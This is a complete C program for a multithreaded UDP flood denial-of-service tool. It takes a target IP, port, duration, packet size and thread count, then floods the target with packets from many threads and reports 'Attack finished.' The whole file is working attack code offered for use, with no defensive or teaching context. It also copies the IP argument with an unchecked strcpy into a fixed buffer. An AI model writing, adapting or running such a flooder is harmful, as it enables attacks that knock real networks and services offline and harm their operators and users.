#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET_SIZE 65507

typedef struct {
    char target_ip[64];
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} thread_data_t;

void *udp_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target.sin_addr);

    char *packet = malloc(data->packet_size);
    if (!packet) pthread_exit(NULL);
    memset(packet, rand() % 256, data->packet_size);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket");
        free(packet);
        pthread_exit(NULL);
    }

    time_t end_time = time(NULL) + data->duration;

    while (time(NULL) < end_time) {
        sendto(sock, packet, data->packet_size, 0, (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <TIME> <SIZE> <THREADS>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time_sec = atoi(argv[3]);
    int size = atoi(argv[4]);
    int threads = atoi(argv[5]);

    if (size > MAX_PACKET_SIZE) {
        printf("Max UDP packet size is %d bytes\n", MAX_PACKET_SIZE);
        return 1;
    }

    pthread_t thread_ids[threads];
    for (int i = 0; i < threads; i++) {
        thread_data_t *data = malloc(sizeof(thread_data_t));
        strcpy(data->target_ip, ip);
        data->target_port = port;
        data->duration = time_sec;
        data->packet_size = size;
        data->thread_id = i;
        pthread_create(&thread_ids[i], NULL, udp_flood, data);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}